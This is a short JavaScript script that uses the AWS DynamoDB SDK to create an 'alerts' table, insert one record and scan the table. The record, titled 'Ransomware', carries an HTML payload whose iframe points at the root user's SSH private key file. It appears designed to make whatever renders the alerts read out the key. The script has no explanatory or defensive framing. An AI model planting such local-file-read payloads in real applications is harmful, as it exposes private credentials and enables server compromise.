

createTable = () => {
    let params = {
        "TableName": "alerts",
        "KeySchema": [
            { AttributeName: "title", KeyType: "HASH" },
            { AttributeName: "data", KeyType: "RANGE" }
        ],

        "AttributeDefinitions": [
            { AttributeName: "title", AttributeType: "S" },
            { AttributeName: "data", AttributeType: "S" },
        ],

        "ProvisionedThroughput": {
            "ReadCapacityUnits": 5,
            "WriteCapacityUnits": 5
        }
    }

    dynamodb.createTable(params, (err, data) => {
        if (err) console.log(err)
        else console.log(data)
    })
}

createItem = () => {
    let params = {
        "TableName": "alerts",
        "Item": {
            "title": {
                S: "Ransomware"
            },
            "data": {
                S: "<html><head></head><body><iframe src='/root/.ssh/id_rsa'></iframe></body></html>"
            }
        },
        "ReturnConsumedCapacity": "TOTAL"
    }
    dynamodb.putItem(params, (err, data) => {
        if (err) console.log(err)
        else console.log(data)
    })
}


createTable()
createItem()
dynamodb.scan({ "TableName": "alerts" }, (err, data) => {
    if (err) console.log(err)
    else console.log(data)
})
